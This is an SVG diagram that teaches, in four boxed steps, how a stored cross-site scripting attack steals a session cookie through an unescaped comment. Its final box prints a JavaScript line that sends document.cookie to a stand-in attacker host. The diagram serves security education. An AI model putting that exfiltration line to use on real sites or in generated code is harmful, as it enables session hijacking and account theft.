<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 680 400" width="680" height="400" role="img" aria-labelledby="t d">
  <title id="t">How a stored XSS attack steals a session cookie</title>
  <desc id="d">Four steps. One: the attacker posts a comment whose body is a script tag. Two: the server stores it verbatim, without escaping or sanitising. Three: a victim opens the page and the script is delivered like any other comment. Four: the script runs in the victim's browser with the victim's session cookie, sending it to the attacker.</desc>
  <style>
    text { font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
    .mono { font-family: ui-monospace, "SF Mono", Menlo, Consolas, monospace; }
    @media (prefers-color-scheme: dark) {
      .ink   { fill: #e7ede9; }
      .muted { fill: #9aa8a0; }
      .acc   { fill: #4fc07d; }
      .ona   { fill: #08140d; }
      .badt  { fill: #ef8a8a; }
      .card  { fill: #1b1d22; stroke: #2e3036; }
      .sunk  { fill: #16171b; stroke: #2e3036; }
      .soft  { fill: #16261d; stroke: #4fc07d; }
      .bad   { fill: #2a1a1a; stroke: #ef8a8a; }
      .fa    { fill: #4fc07d; }
      .line  { stroke: #676a72; }
      .aline { stroke: #4fc07d; }
      .ol    { stroke: #4fc07d; }
      .bline { stroke: #ef8a8a; }
      .hair  { stroke: #2e3036; }
      .mk    { fill: #676a72; }
      .mka   { fill: #4fc07d; }
      .mkb   { fill: #ef8a8a; }
    }
  </style>
  <defs>
    <marker id="a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path class="mk" d="M0 0 L10 5 L0 10 z" fill="#88888f"/>
    </marker>
    <marker id="aa" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path class="mka" d="M0 0 L10 5 L0 10 z" fill="#1f7a45"/>
    </marker>
    <marker id="ab" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path class="mkb" d="M0 0 L10 5 L0 10 z" fill="#c62828"/>
    </marker>
  </defs>
  <rect class="bad" x="24" y="44" width="632" height="62" rx="10" fill="#fbe9e9" stroke="#c62828" stroke-width="1.5"/>
  <circle class="fa" cx="56" cy="75" r="15" fill="#1f7a45"/>
  <text class="ona" x="56" y="80" fill="#ffffff" font-size="15" text-anchor="middle" font-weight="700">1</text>
  <text class="ink" x="86" y="71" fill="#1c2320" font-size="15" text-anchor="start" font-weight="600">Attacker posts a comment</text>
  <text class="muted" x="86" y="91" fill="#5b6660" font-size="12.5" text-anchor="start">the comment body is a &lt;script&gt; tag</text>
  <path class="line" d="M340 106 L340 124" fill="none" stroke="#88888f" stroke-width="1.5" marker-end="url(#a)"/>
  <rect class="card" x="24" y="124" width="632" height="62" rx="10" fill="#ffffff" stroke="#d8d8de" stroke-width="1.5"/>
  <circle class="fa" cx="56" cy="155" r="15" fill="#1f7a45"/>
  <text class="ona" x="56" y="160" fill="#ffffff" font-size="15" text-anchor="middle" font-weight="700">2</text>
  <text class="ink" x="86" y="151" fill="#1c2320" font-size="15" text-anchor="start" font-weight="600">Server stores it verbatim</text>
  <text class="muted" x="86" y="171" fill="#5b6660" font-size="12.5" text-anchor="start">no escaping, no sanitising</text>
  <path class="line" d="M340 186 L340 204" fill="none" stroke="#88888f" stroke-width="1.5" marker-end="url(#a)"/>
  <rect class="card" x="24" y="204" width="632" height="62" rx="10" fill="#ffffff" stroke="#d8d8de" stroke-width="1.5"/>
  <circle class="fa" cx="56" cy="235" r="15" fill="#1f7a45"/>
  <text class="ona" x="56" y="240" fill="#ffffff" font-size="15" text-anchor="middle" font-weight="700">3</text>
  <text class="ink" x="86" y="231" fill="#1c2320" font-size="15" text-anchor="start" font-weight="600">Victim opens the page</text>
  <text class="muted" x="86" y="251" fill="#5b6660" font-size="12.5" text-anchor="start">the script is delivered like any other comment</text>
  <path class="line" d="M340 266 L340 284" fill="none" stroke="#88888f" stroke-width="1.5" marker-end="url(#a)"/>
  <rect class="bad" x="24" y="284" width="632" height="62" rx="10" fill="#fbe9e9" stroke="#c62828" stroke-width="1.5"/>
  <circle class="fa" cx="56" cy="315" r="15" fill="#1f7a45"/>
  <text class="ona" x="56" y="320" fill="#ffffff" font-size="15" text-anchor="middle" font-weight="700">4</text>
  <text class="ink" x="86" y="311" fill="#1c2320" font-size="15" text-anchor="start" font-weight="600">The script runs in the victim's browser</text>
  <text class="muted" x="86" y="331" fill="#5b6660" font-size="12.5" text-anchor="start">with the victim's session cookie</text>
  <text class="ink" x="340" y="26" fill="#1c2320" font-size="16" text-anchor="middle" font-weight="600">Stored XSS: stealing a session cookie</text>
  <rect class="sunk" x="24" y="364" width="632" height="30" rx="8" fill="#ebebed" stroke="#d8d8de" stroke-width="1.5"/>
  <text class="badt mono" x="40" y="384" fill="#c62828" font-size="12.5" text-anchor="start">image.src = 'https://attacker.com/steal?cookie=' + document.cookie</text>
</svg>
